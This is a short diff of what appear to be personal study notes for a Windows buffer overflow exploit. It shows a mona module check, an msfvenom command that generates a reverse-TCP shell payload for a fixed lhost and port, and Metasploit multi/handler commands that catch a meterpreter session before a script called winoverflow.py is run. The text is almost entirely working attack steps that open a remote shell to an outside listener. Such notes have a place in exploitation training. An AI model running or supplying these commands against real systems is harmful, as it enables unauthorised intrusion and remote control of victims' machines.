@@ -88,6 +88,16 @@ in log data.  !mona modules  # list out all loadded dlls and protection
               
               copy clipboard address
               
-        msfvenom -p windows/shell/reverse_tcp lhost =10.50.25.239 -b "\x00" -f python
+        msfvenom -p windows/shell/reverse_tcp lhost =10.50.25.239 lport=4444 -b "\x00" -f python
         
-        DONT COPY LINE THAT INTIALIZES buf+++++++++++++++++++++++++++++++++++++++
+        DONT INSTANTLY COPY LINE THAT INTIALIZES buf+++++++++++++++++++++++++++++++++++++++
+
+
+      msfconsole
+      use multi/handler
+      set payload windows/meterpreter/reverse_tcp
+      set lhost 0.0.0.0
+      exploit
+      
+      then run winoverflow.py
+      
